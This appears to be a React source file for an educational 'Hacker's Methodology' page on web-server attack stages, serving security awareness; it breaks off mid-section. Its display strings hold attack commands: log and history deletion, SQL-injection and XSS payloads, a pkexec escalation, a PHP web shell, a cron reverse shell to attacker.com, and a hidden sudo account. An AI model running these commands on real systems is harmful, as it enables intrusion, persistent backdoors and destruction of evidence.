import React, { useEffect, useRef } from 'react';
import { motion, useScroll, useTransform, useInView, AnimatePresence } from 'framer-motion';
import { 
  Shield, 
  Terminal, 
  Search, 
  Zap, 
  Lock, 
  Eye, 
  Skull, 
  Server, 
  Globe, 
  Cpu, 
  Activity,
  ChevronDown,
  AlertTriangle,
  CheckCircle2,
  Bug,
  Key,
  Copy,
  Network,
  Share2,
  UserPlus,
  Clock,
  Repeat,
  Database,
  Download,
  Trash2,
  Eraser,
  Ghost
} from 'lucide-react';

import { GoogleGenAI } from "@google/genai";

// --- Components ---

const Section = ({ children, className = "" }: { children: React.ReactNode, className?: string }) => {
  const ref = useRef(null);
  const isInView = useInView(ref, { once: false, amount: 0.3 });

  return (
    <section 
      ref={ref}
      className={`min-h-screen flex flex-col justify-center px-6 md:px-20 py-20 relative overflow-hidden ${className}`}
    >
      <motion.div
        initial={{ opacity: 0, y: 50 }}
        animate={isInView ? { opacity: 1, y: 0 } : { opacity: 0, y: 50 }}
        transition={{ duration: 0.8, ease: "easeOut" }}
      >
        {children}
      </motion.div>
    </section>
  );
};

const StaticImage = ({ src, title }: { src: string, title: string }) => {
  const [loading, setLoading] = React.useState(true);

  return (
    <div className="relative w-full h-full bg-black/20 overflow-hidden">
      {loading && (
        <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/40 gap-4 z-10">
          <motion.div 
            animate={{ rotate: 360 }}
            transition={{ repeat: Infinity, duration: 2, ease: "linear" }}
            className="text-cyber-green"
          >
            <Activity size={48} />
          </motion.div>
          <p className="font-mono text-xs text-cyber-green/60 animate-pulse uppercase tracking-[0.2em]">
            Loading Intelligence Data...
          </p>
        </div>
      )}
      <img 
        src={src} 
        alt={title}
        onLoad={() => setLoading(false)}
        className={`w-full h-full object-cover transition-opacity duration-700 ${loading ? 'opacity-0' : 'opacity-80'}`}
        referrerPolicy="no-referrer"
      />
      <div className="absolute inset-0 bg-gradient-to-t from-cyber-bg via-transparent to-transparent pointer-events-none" />
    </div>
  );
};

const GlitchText = ({ text }: { text: string }) => {
  return (
    <div className="relative inline-block group">
      <span className="relative z-10">{text}</span>
      <span className="absolute top-0 left-0 -z-10 text-cyber-red opacity-0 group-hover:opacity-70 group-hover:translate-x-1 group-hover:-translate-y-1 transition-all duration-75">
        {text}
      </span>
      <span className="absolute top-0 left-0 -z-10 text-cyber-blue opacity-0 group-hover:opacity-70 group-hover:-translate-x-1 group-hover:translate-y-1 transition-all duration-75">
        {text}
      </span>
    </div>
  );
};

const CoveringTracksSimulator = () => {
  const [isWiped, setIsWiped] = React.useState(false);
  const [logs, setLogs] = React.useState([
    "# 1. Clear system logs",
    "> rm -rf /var/log/apache2/access.log",
    "> rm -rf /var/log/auth.log",
    "",
    "# 2. Clear command history",
    "> history -c",
    "> rm ~/.bash_history",
    "",
    "# 3. Remove temporary files and tools",
    "> rm -rf /tmp/exploit_payload",
    "> rm /var/www/html/uploads/shell.php",
    "",
    "# 4. Final check for evidence",
    "> ls -la /var/log"
  ]);

  const handleWipe = () => {
    setLogs(prev => [...prev, "", "[SYSTEM] INITIATING SECURE WIPE...", "[SYSTEM] OVERWRITING SECTORS...", "[SYSTEM] ERASING METADATA..."]);
    
    setTimeout(() => {
      setIsWiped(true);
      setLogs(["[SYSTEM] NO LOGS FOUND.", "[SYSTEM] SYSTEM SECURE.", "[SYSTEM] STATUS: CLEAN."]);
    }, 2000);
  };

  return (
    <div className="bg-black/80 border border-cyber-red/30 rounded-xl overflow-hidden font-mono text-xs shadow-2xl">
      <div className="bg-cyber-red/10 px-4 py-2 border-b border-cyber-red/30 flex items-center justify-between">
        <span className="text-cyber-red font-bold uppercase tracking-widest text-[10px]">Evidence Eraser</span>
        <div className="flex gap-1">
          <div className="w-2 h-2 rounded-full bg-cyber-red/50" />
          <div className="w-2 h-2 rounded-full bg-cyber-red/30" />
        </div>
      </div>
      
      <div className="p-6">
        <div className="bg-black p-4 rounded border border-white/5 h-64 overflow-y-auto space-y-1 custom-scrollbar mb-6">
          {logs.map((log, i) => (
            <div key={i} className={`${log.startsWith('[SYSTEM]') ? 'text-cyber-green' : log.startsWith('#') ? 'text-yellow-500/80 italic' : 'text-gray-400'}`}>
              {log}
            </div>
          ))}
          {!isWiped && (
            <motion.div 
              animate={{ opacity: [1, 0] }}
              transition={{ repeat: Infinity, duration: 0.8 }}
              className="inline-block w-2 h-3 bg-cyber-red"
            />
          )}
        </div>

        <div className="flex justify-center">
          <button 
            onClick={handleWipe}
            disabled={isWiped}
            className={`px-8 py-3 rounded-lg font-bold flex items-center gap-2 transition-all ${
              isWiped 
                ? 'bg-gray-800 text-gray-500 cursor-not-allowed' 
                : 'bg-cyber-red text-black hover:bg-cyber-red/80 shadow-lg shadow-cyber-red/20'
            }`}
          >
            {isWiped ? <CheckCircle2 size={18} /> : <Trash2 size={18} />}
            {isWiped ? "TRACKS COVERED" : "WIPE ALL EVIDENCE"}
          </button>
        </div>
      </div>
    </div>
  );
};

const FrameworkCard = ({ title, stages, index, activeIndex, onClick }: any) => {
  const diff = index - activeIndex;
  const isActive = diff === 0;
  
  return (
    <motion.div
      animate={{
        x: diff * 280,
        scale: isActive ? 1.1 : 0.85,
        zIndex: 100 - Math.abs(diff) * 10,
        opacity: Math.abs(diff) > 2 ? 0 : 1 - Math.abs(diff) * 0.3,
        rotateY: diff * -15,
      }}
      transition={{ type: "spring", stiffness: 300, damping: 30 }}
      onClick={onClick}
      className="absolute top-0 left-1/2 -translate-x-1/2 w-[300px] md:w-[360px] h-[500px] cursor-pointer"
      style={{ perspective: 1000 }}
    >
      <div className={`relative bg-black/90 border ${isActive ? 'border-cyber-green/60 shadow-cyber-green/20' : 'border-cyber-green/20'} p-8 rounded-2xl backdrop-blur-xl shadow-2xl group transition-all duration-500 h-full flex flex-col`}>
        <div className={`absolute -top-3 -left-3 ${isActive ? 'bg-cyber-green text-black' : 'bg-white/10 text-gray-400'} px-3 py-1 font-mono text-[10px] font-bold rounded shadow-lg z-20 transition-colors`}>
          FRAMEWORK_0{index + 1}
        </div>
        <h3 className={`text-xl font-bold mb-6 ${isActive ? 'text-cyber-green terminal-glow' : 'text-gray-400'} font-display transition-all`}>{title}</h3>
        <ul className="space-y-2 flex-grow overflow-y-auto scrollbar-hide">
          {stages.map((stage: string, i: number) => (
            <li key={i} className={`flex items-center gap-3 ${isActive ? 'text-gray-300' : 'text-gray-600'} transition-colors`}>
              <span className={`w-1 h-1 rounded-full ${isActive ? 'bg-cyber-green' : 'bg-gray-700'}`} />
              <span className="text-xs font-mono">{stage}</span>
            </li>
          ))}
        </ul>
        <div className="mt-8 pt-4 border-t border-white/5 flex justify-between items-center opacity-30">
          <span className="text-[8px] font-mono uppercase tracking-widest">Protocol: Standard</span>
          <Activity size={12} className={isActive ? "text-cyber-green" : "text-gray-600"} />
        </div>
      </div>
    </motion.div>
  );
};

const FrameworkCarousel = () => {
  const [activeIndex, setActiveIndex] = React.useState(0);
  const frameworks = [
    {
      title: "Cyber Kill Chain",
      stages: ["Reconnaissance", "Weaponization", "Delivery", "Exploitation", "Installation", "Command and Control", "Actions on Objectives"]
    },
    {
      title: "MITRE ATT&K",
      stages: ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement", "Collection", "Exfiltration", "Impact"]
    },
    {
      title: "PTES Standard",
      stages: ["Pre-engagement", "Intelligence Gathering", "Threat Modeling", "Vulnerability Analysis", "Exploitation", "Post Exploitation", "Reporting"]
    },
    {
      title: "Unified Kill Chain",
      stages: ["Infiltration", "Propagation", "Aggregation", "Exfiltration", "Impact", "Objectives"]
    }
  ];

  const next = () => setActiveIndex((prev) => (prev + 1) % frameworks.length);
  const prev = () => setActiveIndex((prev) => (prev - 1 + frameworks.length) % frameworks.length);

  return (
    <div className="relative w-full h-full flex items-center justify-center">
      <div className="absolute inset-0 flex items-center justify-center overflow-visible">
        {frameworks.map((framework, i) => (
          <FrameworkCard 
            key={i}
            index={i}
            activeIndex={activeIndex}
            title={framework.title}
            stages={framework.stages}
            onClick={() => setActiveIndex(i)}
          />
        ))}
      </div>
      
      {/* Navigation Controls */}
      <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex gap-4 z-[200]">
        <button 
          onClick={(e) => { e.stopPropagation(); prev(); }}
          className="p-3 rounded-full bg-white/5 border border-white/10 text-cyber-green hover:bg-cyber-green/20 transition-all"
        >
          <Repeat className="rotate-180" size={20} />
        </button>
        <div className="flex gap-2 items-center">
          {frameworks.map((_, i) => (
            <div 
              key={i}
              className={`w-2 h-2 rounded-full transition-all duration-300 ${i === activeIndex ? 'bg-cyber-green w-6' : 'bg-white/20'}`}
            />
          ))}
        </div>
        <button 
          onClick={(e) => { e.stopPropagation(); next(); }}
          className="p-3 rounded-full bg-white/5 border border-white/10 text-cyber-green hover:bg-cyber-green/20 transition-all"
        >
          <Repeat size={20} />
        </button>
      </div>
    </div>
  );
};

const PayloadSimulator = () => {
  const [input, setInput] = React.useState("");
  const [logs, setLogs] = React.useState<string[]>(["[SYSTEM] Server listening on port 443...", "[SYSTEM] Waiting for input..."]);
  const [isSimulating, setIsSimulating] = React.useState(false);

  const [copiedId, setCopiedId] = React.useState<string | null>(null);

  const attacks = [
    { 
      name: "SQL Injection", 
      payload: "' OR '1'='1' --", 
      effect: "Bypassing authentication...",
      result: "ACCESS GRANTED: Admin dashboard unlocked.",
      description: "Tricks the database into thinking a login is valid by making the query always return true."
    },
    { 
      name: "XSS", 
      payload: "<script>alert('Hacked!')</script>", 
      effect: "Executing remote script...",
      result: "EXPLOIT SUCCESS: Session cookie exfiltrated.",
      description: "Injects a malicious script that runs in the victim's browser, often used to steal session data."
    },
    { 
      name: "Brute Force", 
      payload: "admin:password123", 
      effect: "Testing credentials...",
      result: "CRACKED: Login successful for user 'admin'.",
      description: "Systematically tries common password combinations until it finds a match for a target account."
    }
  ];

  const runSimulation = (payload: string, result: string, effect: string) => {
    setIsSimulating(true);
    setLogs(prev => [...prev, `> Received input: ${payload}`, `[PROCESS] ${effect}`]);
    
    setTimeout(() => {
      setLogs(prev => [...prev, `[SUCCESS] ${result}`]);
      setIsSimulating(false);
    }, 1500);
  };

  return (
    <div className="bg-black/80 border border-cyber-red/30 rounded-xl overflow-hidden font-mono text-xs shadow-2xl">
      <div className="bg-cyber-red/10 px-4 py-2 border-b border-cyber-red/30 flex items-center justify-between">
        <span className="text-cyber-red font-bold uppercase tracking-widest text-[10px]">Vulnerability Simulator</span>
        <div className="flex gap-2">
          <button 
            onClick={() => setLogs(["[SYSTEM] Server listening on port 443...", "[SYSTEM] Waiting for input..."])}
            className="text-[10px] text-cyber-red/50 hover:text-cyber-red transition-colors"
          >
            Clear
          </button>
          <div className="flex gap-1">
            <div className="w-2 h-2 rounded-full bg-cyber-red/50" />
            <div className="w-2 h-2 rounded-full bg-cyber-red/30" />
          </div>
        </div>
      </div>
      
      <div className="p-6">
        <div className="grid grid-cols-1 gap-4 mb-6">
          {attacks.map((attack) => (
            <div key={attack.name} className="flex flex-col md:flex-row md:items-center gap-4 p-3 bg-white/5 border border-white/10 rounded-lg group hover:border-cyber-red/50 transition-colors">
              <div className="flex-grow min-w-0">
                <div className="flex items-center justify-between mb-1">
                  <div className="text-cyber-red font-bold">{attack.name}</div>
                  <button 
                    onClick={() => {
                      navigator.clipboard.writeText(attack.payload);
                      setLogs(prev => [...prev, `[SYSTEM] Payload copied: ${attack.name}`]);
                      setCopiedId(attack.name);
                      setTimeout(() => setCopiedId(null), 2000);
                    }}
                    className="px-3 py-1 bg-white/5 text-gray-400 border border-white/10 rounded hover:bg-white/10 hover:text-white transition-all flex items-center gap-2 text-[10px] min-w-[70px] justify-center"
                  >
                    {copiedId === attack.name ? (
                      <span className="text-cyber-green">Copied!</span>
                    ) : (
                      <>
                        <Copy size={12} />
                        Copy
                      </>
                    )}
                  </button>
                </div>
                <div className="flex flex-col md:flex-row md:items-center gap-4">
                  <code className="text-[10px] text-gray-500 bg-black/30 px-2 py-1 rounded shrink-0">{attack.payload}</code>
                  <div className="text-[10px] text-gray-400 italic border-l border-white/10 pl-3 leading-tight">
                    {attack.description}
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>

        <div className="flex gap-2 mb-4">
          <div className="relative flex-grow">
            <input 
              type="text"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="Paste payload here..."
              className="w-full bg-black border border-white/10 rounded px-3 py-2 text-cyber-red font-mono text-[10px] focus:outline-none focus:border-cyber-red/50 transition-colors"
            />
            <button 
              onClick={async () => {
                const text = await navigator.clipboard.readText();
                setInput(text);
              }}
              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors"
              title="Paste from Clipboard"
            >
              <Terminal size={12} />
            </button>
          </div>
          <button 
            onClick={() => {
              if (!input) return;
              const attack = attacks.find(a => a.payload === input) || { 
                name: "Unknown Payload", 
                result: "ERROR: Unrecognized command or invalid syntax.", 
                effect: "Analyzing input..." 
              };
              runSimulation(input, attack.result, attack.effect);
              setInput("");
            }}
            disabled={isSimulating || !input}
            className="px-4 py-2 bg-cyber-red text-black font-bold rounded hover:bg-cyber-red/80 transition-all disabled:opacity-50"
          >
            Execute
          </button>
        </div>

        <div className="bg-black p-4 rounded border border-white/5 h-40 overflow-y-auto space-y-1 custom-scrollbar">
          {logs.map((log, i) => (
            <div key={i} className={`${log.startsWith('[SUCCESS]') ? 'text-cyber-green' : log.startsWith('[PROCESS]') ? 'text-yellow-500' : 'text-gray-400'}`}>
              {log}
            </div>
          ))}
          {isSimulating && (
            <motion.div 
              animate={{ opacity: [1, 0] }}
              transition={{ repeat: Infinity, duration: 0.8 }}
              className="inline-block w-2 h-3 bg-cyber-red"
            />
          )}
        </div>
      </div>
    </div>
  );
};
const TerminalWindow = ({ title, lines }: { title: string, lines: string[] }) => {
  return (
    <div className="bg-black/80 border border-cyber-green/30 rounded-lg overflow-hidden font-mono text-sm shadow-2xl shadow-cyber-green/10">
      <div className="bg-cyber-green/10 px-4 py-2 border-b border-cyber-green/30 flex items-center justify-between">
        <div className="flex gap-2">
          <div className="w-3 h-3 rounded-full bg-cyber-red/50" />
          <div className="w-3 h-3 rounded-full bg-yellow-500/50" />
          <div className="w-3 h-3 rounded-full bg-cyber-green/50" />
        </div>
        <span className="text-cyber-green/70 text-xs">{title}</span>
      </div>
      <div className="p-4 space-y-1">
        {lines.map((line, i) => (
          <div key={i} className="flex gap-3">
            <span className="text-cyber-green/50">[{i + 1}]</span>
            <span className={line.startsWith('>') ? 'text-cyber-green' : line.startsWith('#') ? 'text-yellow-500/80 italic' : 'text-gray-400'}>
              {line}
            </span>
          </div>
        ))}
        <motion.div 
          animate={{ opacity: [1, 0] }}
          transition={{ repeat: Infinity, duration: 0.8 }}
          className="inline-block w-2 h-4 bg-cyber-green ml-1 translate-y-1"
        />
      </div>
    </div>
  );
};

const Card = ({ icon: Icon, title, description, tools = [], colorClass = "text-cyber-green", onClick }: any) => (
  <motion.div 
    whileHover={{ scale: 1.02 }}
    whileTap={{ scale: 0.98 }}
    onClick={onClick}
    className="bg-white/5 border border-white/10 p-6 rounded-xl backdrop-blur-sm hover:border-cyber-green/50 transition-colors group cursor-pointer relative overflow-hidden flex flex-col h-full"
  >
    <div className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity">
      <Eye size={14} className="text-cyber-green/50" />
    </div>
    <div className={`mb-4 p-3 rounded-lg bg-white/5 inline-block ${colorClass}`}>
      <Icon size={24} />
    </div>
    <h3 className="text-xl font-bold mb-2 font-display">{title}</h3>
    <p className="text-gray-400 text-sm leading-relaxed mb-6 flex-grow">{description}</p>
    
    {tools.length > 0 && (
      <div className="mt-auto pt-4 border-t border-white/5">
        <div className="text-[10px] font-mono text-gray-500 uppercase tracking-widest mb-2">Common Tools</div>
        <div className="flex flex-wrap gap-2">
          {tools.map((tool: string) => (
            <span key={tool} className="px-2 py-1 rounded bg-white/5 text-[10px] font-mono text-cyber-green/70 border border-cyber-green/10">
              {tool}
            </span>
          ))}
        </div>
      </div>
    )}

    <div className="mt-4 text-[10px] font-mono text-cyber-green/40 uppercase tracking-widest opacity-0 group-hover:opacity-100 transition-opacity">
      Click to view intelligence
    </div>
  </motion.div>
);

// --- Main App ---

export default function App() {
  const [selectedRecon, setSelectedRecon] = React.useState<null | { title: string, img: string, desc: string }>(null);
  const [selectedCountermeasure, setSelectedCountermeasure] = React.useState<null | { title: string, img: string, desc: string, tools?: string[] }>(null);
  console.log("App rendering, selectedRecon:", selectedRecon);
  
  useEffect(() => {
    console.log("selectedRecon state changed:", selectedRecon);
  }, [selectedRecon]);

  const { scrollYProgress } = useScroll();
  const opacity = useTransform(scrollYProgress, [0, 0.05], [1, 0]);
  const scale = useTransform(scrollYProgress, [0, 0.05], [1, 0.9]);

  return (
    <div className="relative grid-bg">
      {/* Debug Indicator */}
      <div className="fixed top-4 right-4 z-[10000] pointer-events-none">
        <div className="bg-black/80 border border-cyber-green/30 p-2 rounded text-[10px] font-mono text-cyber-green">
          MODAL_STATE: {selectedRecon ? "OPEN" : "CLOSED"}
        </div>
      </div>

      {/* Progress Bar */}
      <motion.div 
        className="fixed top-0 left-0 right-0 h-1 bg-cyber-green z-50 origin-left"
        style={{ scaleX: scrollYProgress }}
      />

      {/* Scan Line Overlay */}
      <div className="fixed inset-0 pointer-events-none z-40 overflow-hidden opacity-20">
        <div className="scan-line" />
      </div>

      {/* Hero Section */}
      <Section className="items-center text-center">
        <motion.div style={{ opacity, scale }} className="max-w-4xl">
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-cyber-green/10 border border-cyber-green/30 text-cyber-green text-xs font-bold uppercase tracking-widest mb-8">
            <Activity size={14} />
            System Analysis: Active
          </div>
          <h1 className="text-6xl md:text-8xl font-black mb-6 leading-tight">
            THE <span className="text-cyber-green terminal-glow">HACKER'S</span><br />
            METHODOLOGY
          </h1>
          <p className="text-xl text-gray-400 mb-12 max-w-2xl mx-auto font-light">
            Understanding the anatomy of a web server attack and the 
            countermeasures required to build an impenetrable digital fortress.
          </p>
          <div className="flex flex-col items-center gap-4">
            <motion.div 
              animate={{ y: [0, 10, 0] }}
              transition={{ repeat: Infinity, duration: 2 }}
              className="text-cyber-green/50"
            >
              <ChevronDown size={32} />
            </motion.div>
            <span className="text-xs font-mono text-cyber-green/30 uppercase tracking-widest">Scroll to Initiate</span>
          </div>
        </motion.div>
      </Section>

      {/* Cybersecurity Frameworks Section */}
      <Section className="bg-black/20 overflow-hidden">
        <div className="max-w-7xl mx-auto w-full h-full flex flex-col">
          <div className="text-center mb-12">
            <h2 className="text-5xl font-black mb-6">THE KILL CHAINS</h2>
            <p className="text-gray-400 max-w-2xl mx-auto">
              Standardized frameworks used by security professionals to model, 
              detect, and mitigate advanced persistent threats (APTs).
            </p>
          </div>
          
          <div className="relative flex-grow flex items-center justify-center">
            <div className="relative w-full h-[550px] flex items-center justify-center overflow-visible">
              <FrameworkCarousel />
            </div>
          </div>
        </div>
      </Section>

      {/* Methodology Intro */}
      <Section>
        <div className="grid md:grid-cols-2 gap-12 items-center">
          <div>
            <h2 className="text-4xl font-bold mb-6 flex items-center gap-4">
              <Terminal className="text-cyber-green" />
              <GlitchText text="The Attack Lifecycle" />
            </h2>
            <p className="text-gray-400 mb-8 text-lg">
              Hackers don't just "guess" passwords. They follow a systematic, 
              multi-stage process designed to find the weakest link in your 
              infrastructure.
            </p>
            <div className="space-y-4">
              {[
                { step: "01", title: "Reconnaissance & Scanning", desc: "Gathering intel and finding vulnerabilities." },
                { step: "02", title: "Gaining Access", desc: "Exploiting the weakness." },
                { step: "03", title: "Privilege Escalation & Lateral Movement", desc: "Gaining higher privileges and moving through the internal network." },
                { step: "04", title: "Maintaining Access", desc: "Ensuring they can come back." },
                { step: "05", title: "Data Exfiltration", desc: "Stealing the target's sensitive data." },
                { step: "06", title: "Covering Tracks", desc: "Deleting logs and evidence." },
              ].map((item) => (
                <div key={item.step} className="flex gap-4 items-start group">
                  <span className="font-mono text-cyber-green font-bold">{item.step}</span>
                  <div>
                    <h4 className="font-bold group-hover:text-cyber-green transition-colors">{item.title}</h4>
                    <p className="text-sm text-gray-500">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
          <div className="relative">
            <div className="absolute -inset-4 bg-cyber-green/10 blur-3xl rounded-full" />
            <TerminalWindow 
              title="attack_plan.sh"
              lines={[
                "> whoami",
                "root",
                "> nmap -sV -p- target-server.com",
                "Scanning target-server.com...",
                "PORT     STATE SERVICE VERSION",
                "80/tcp   open  http    Apache 2.4.41",
                "443/tcp  open  ssl/http Apache 2.4.41",
                "3306/tcp open  mysql   MySQL 5.7.28",
                "> searchsploit apache 2.4.41",
                "Found 3 potential exploits..."
              ]}
            />
          </div>
        </div>
      </Section>

      {/* Phase 1: Recon & Scanning */}
      <Section className="bg-black/40">
        <div className="max-w-5xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold mb-4">Phase 1: Recon & Scanning</h2>
            <p className="text-gray-400">The silent phase where the hacker learns everything about your server.</p>
          </div>
          <div className="grid md:grid-cols-3 gap-6">
            <Card 
              icon={Search}
              title="Footprinting"
              description="Gathering public info: DNS records, IP ranges, employee emails, and tech stack details from headers."
              tools={["WHOIS", "NSLookup", "Shodan", "Maltego"]}
              onClick={() => {
                console.log("Footprinting clicked");
                setSelectedRecon({
                  title: "Footprinting Intelligence",
                  img: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1200",
                  desc: "Example of WHOIS data and DNS records being harvested to map out a target's digital footprint."
                });
              }}
            />
            <Card 
              icon={Eye}
              title="Network Scanning"
              description="Using tools like Nmap to identify open ports, active services, and the operating system version."
              colorClass="text-cyber-blue"
              tools={["Nmap", "Masscan", "Zenmap", "Hping3"]}
              onClick={() => {
                console.log("Network Scanning clicked");
                setSelectedRecon({
                  title: "Network Scan Results",
                  img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&q=80&w=1200",
                  desc: "A visualization of open ports and running services discovered during an automated network sweep."
                });
              }}
            />
            <Card 
              icon={Bug}
              title="Vulnerability Research"
              description="Mapping discovered services to known CVEs (Common Vulnerabilities and Exposures) in public databases."
              colorClass="text-yellow-500"
              tools={["Nessus", "OpenVAS", "Nikto", "Searchsploit"]}
              onClick={() => {
                console.log("Vulnerability Research clicked");
                setSelectedRecon({
                  title: "Vulnerability Database",
                  img: "https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=1200",
                  desc: "Searching through CVE databases to find specific exploits for the discovered service versions."
                });
              }}
            />
          </div>
        </div>
      </Section>

      {/* Phase 2: Exploitation */}
      <Section>
        <div className="grid md:grid-cols-2 gap-16 items-center">
          <div className="order-2 md:order-1">
            <PayloadSimulator />
          </div>
          <div className="order-1 md:order-2">
            <h2 className="text-4xl font-bold mb-6">
              Phase 2: <span className="text-cyber-red">Gaining Access</span>
            </h2>
            <p className="text-gray-400 text-lg mb-8 leading-relaxed">
              This is the moment of impact. The hacker uses the vulnerabilities 
              found in Phase 1 to bypass security controls and execute code on 
              your server.
            </p>
            <div className="space-y-6">
              <div className="flex gap-4">
                <div className="w-12 h-12 rounded-lg bg-cyber-red/10 flex items-center justify-center shrink-0 text-cyber-red border border-cyber-red/20">
                  <Zap size={24} />
                </div>
                <div>
                  <h4 className="font-bold text-lg mb-1">Exploitation Logic</h4>
                  <p className="text-sm text-gray-500">Hackers craft specific payloads to trick the server into executing unintended commands or revealing sensitive data.</p>
                </div>
              </div>
              <div className="p-4 bg-white/5 border border-white/10 rounded-xl">
                <div className="text-[10px] font-mono text-cyber-red uppercase tracking-widest mb-2">Pro Tip</div>
                <p className="text-xs text-gray-400 italic">"Most attacks succeed because of poor input validation. Never trust data from the client."</p>
              </div>
            </div>
          </div>
        </div>
      </Section>

      {/* Phase 3: Lateral Movement */}
      <Section className="bg-black/40">
        <div className="max-w-5xl mx-auto">
          <div className="grid md:grid-cols-2 gap-16 items-center">
            <div>
              <h2 className="text-4xl font-bold mb-6">
                Phase 3: <span className="text-cyber-blue">Privilege Escalation & Lateral Movement</span>
              </h2>
              <p className="text-gray-400 text-lg mb-8 leading-relaxed">
                Once a foothold is established, the hacker's goal shifts to expanding their control. They exploit local vulnerabilities to gain higher privileges and use the compromised server as a bridge to explore the internal network.
              </p>
              
              <div className="space-y-6">
                {[
                  {
                    icon: Network,
                    title: "Internal Reconnaissance",
                    desc: "Mapping out the internal network, identifying database servers, file shares, and other high-value targets."
                  },
                  {
                    icon: Share2,
                    title: "Pivoting & Tunneling",
                    desc: "Routing traffic through the compromised host to bypass firewalls and reach isolated network segments."
                  },
                  {
                    icon: Shield,
                    title: "Privilege Escalation",
                    desc: "Exploiting local vulnerabilities to gain administrative or 'root' access on the compromised system."
                  }
                ].map((item, i) => (
                  <div key={i} className="flex gap-4 group">
                    <div className="w-10 h-10 rounded bg-cyber-blue/10 flex items-center justify-center shrink-0 text-cyber-blue border border-cyber-blue/20 group-hover:bg-cyber-blue/20 transition-colors">
                      <item.icon size={20} />
                    </div>
                    <div>
                      <h4 className="font-bold mb-1 group-hover:text-cyber-blue transition-colors">{item.title}</h4>
                      <p className="text-sm text-gray-500">{item.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            
            <div className="relative">
              <div className="absolute -inset-4 bg-cyber-blue/10 blur-3xl rounded-full" />
              <TerminalWindow 
                title="priv_esc_and_discovery.sh"
                lines={[
                  "# 1. Privilege Escalation",
                  "> whoami",
                  "www-data",
                  "> find / -perm -4000 -type f 2>/dev/null",
                  "/usr/bin/pkexec",
                  "> ./exploit-pkexec",
                  "[+] Root shell obtained!",
                  "> whoami",
                  "root",
                  "",
                  "# 2. Internal Reconnaissance",
                  "> ip addr show",
                  "eth0: 10.0.1.45/24",
                  "> nmap -sn 10.0.1.0/24",
                  "Scanning internal subnet...",
                  "10.0.1.10  - DB-PROD-01 (MySQL)",
                  "10.0.1.100 - DC-PRIMARY (AD)",
                  "> ssh-keyscan 10.0.1.10",
                  "Gathering SSH keys for pivoting..."
                ]}
              />
              <div className="mt-6 p-4 bg-cyber-blue/5 border border-cyber-blue/20 rounded-xl backdrop-blur-sm">
                <div className="text-[10px] font-mono text-cyber-blue uppercase tracking-widest mb-2">Network Insight</div>
                <p className="text-xs text-gray-400">
                  "Lateral movement is often where hackers find the 'Crown Jewels'. A web server is just the front door; the database is the vault."
                </p>
              </div>
            </div>
          </div>
        </div>
      </Section>

      {/* Phase 4: Maintaining Access */}
      <Section>
        <div className="grid md:grid-cols-2 gap-16 items-center">
          <div className="order-2 md:order-1">
            <div className="relative">
              <div className="absolute -inset-4 bg-yellow-500/10 blur-3xl rounded-full" />
              <TerminalWindow 
                title="persistence_setup.sh"
                lines={[
                  "# 1. Create a persistent web shell in a public directory",
                  "# This allows remote command execution via HTTP GET requests.",
                  "> cat <<EOF > /var/www/html/uploads/shell.php",
                  "<?php system(\\$_GET['cmd']); ?>",
                  "EOF",
                  "",
                  "# 2. Schedule a recurring reverse shell via Crontab",
                  "# Automatically reconnects to the attacker's server every 5 minutes.",
                  "> (crontab -l ; echo \"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\") | crontab -",
                  "crontab: installing new crontab",
                  "",
                  "# 3. Create a hidden administrative account for direct access",
                  "# 'backup_svc' looks like a legitimate system service account.",
                  "> useradd -m -G sudo backup_svc",
                  "> echo 'backup_svc:P@ssw0rd123!' | chpasswd",
                  "User 'backup_svc' created with root privileges."
                ]}
              />
              <div className="mt-6 p-4 bg-yellow-500/5 border border-yellow-500/20 rounded-xl">
                <div className="text-[10px] font-mono text-yellow-500 uppercase tracking-widest mb-2">Persistence Alert</div>
                <p className="text-xs text-gray-400">
                  "A hacker's greatest fear is losing their foothold. They will often hide multiple backdoors in obscure directories to ensure redundancy."
                </p>
              </div>
            </div>
          </div>
          <div className="order-1 md:order-2">
            <h2 className="text-4xl font-bold mb-6">
              Phase 4: <span className="text-yellow-500">Maintaining Access</span>
            </h2>
            <p className="text-gray-400 text-lg mb-8 leading-relaxed">
              Establishing a permanent presence. The attacker ensures they can return to the system at any time, regardless of security updates or reboots.
            </p>
            
            <div className="space-y-6">
              {[
                {
                  icon: UserPlus,
                  title: "Account Creation",
                  desc: "Adding new administrative users or SSH keys to bypass standard login prompts."
                },
                {
                  icon: Clock,
                  title: "Scheduled Tasks",
                  desc: "Using Cron jobs or Windows Task Scheduler to execute malicious code at regular intervals."
                },
                {
                  icon: Repeat,
                  title: "Web Shells",
                  desc: "Uploading scripts that provide a persistent command-line interface through the web server."
                }
              ].map((item, i) => (
                <div key={i} className="flex gap-4 group">
                  <div className="w-10 h-10 rounded bg-yellow-500/10 flex items-center justify-center shrink-0 text-yellow-500 border border-yellow-500/20 group-hover:bg-yellow-500/20 transition-colors">
                    <item.icon size={20} />
                  </div>
                  <div>
                    <h4 className="font-bold mb-1 group-hover:text-yellow-500 transition-colors">{item.title}</h4>
                    <p className="text-sm text-gray-500">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </Section>

      {/* Phase 5: Data Exfiltration */}
      <Section className="bg-black/40">
        <div className="max-w-5xl mx-auto">
          <div className="grid md:grid-cols-2 gap-16 items-center">
            <div>
              <h2 className="text-4xl font-bold mb-6">
                Phase 5: <span className="text-cyber-green">Data Exfiltration</span>
              </h2>
              <p className="text-gray-400 text-lg mb-8 leading-relaxed">
                The ultimate objective. Once the attacker has control and persistence, they begin the process of identifying and stealing sensitive data.
              </p>
              
              <div className="space-y-6">
                {[
                  {
